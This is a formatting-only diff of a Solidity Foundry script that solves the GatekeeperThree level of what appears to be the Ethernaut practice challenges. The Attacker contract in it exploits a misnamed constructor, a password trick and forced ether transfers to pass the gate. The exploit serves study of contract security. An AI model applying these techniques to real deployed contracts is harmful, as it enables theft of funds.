@@ -15,9 +15,7 @@ contract Attacker {
         target.construct0r();
         target.createTrick();
         target.getAllowance(block.timestamp);
-        (bool success, ) = payable(address(target)).call{
-            value: address(this).balance
-        }("");
+        (bool success,) = payable(address(target)).call{value: address(this).balance}("");
         require(success, "failed to send ether to target address");
         target.enter();
     }
@@ -27,13 +25,9 @@ contract SolveGatekeeperThree is Script {
     function run() public {
         vm.startBroadcast();
 
-        GatekeeperThree gatekeeperThree = GatekeeperThree(
-            payable(vm.envAddress("GATEKEEPERTHREE_ADDRESS"))
-        );
+        GatekeeperThree gatekeeperThree = GatekeeperThree(payable(vm.envAddress("GATEKEEPERTHREE_ADDRESS")));
 
-        Attacker attacker = new Attacker{value: 0.0011 ether}(
-            payable(address(gatekeeperThree))
-        );
+        Attacker attacker = new Attacker{value: 0.0011 ether}(payable(address(gatekeeperThree)));
 
         attacker.hack();
 
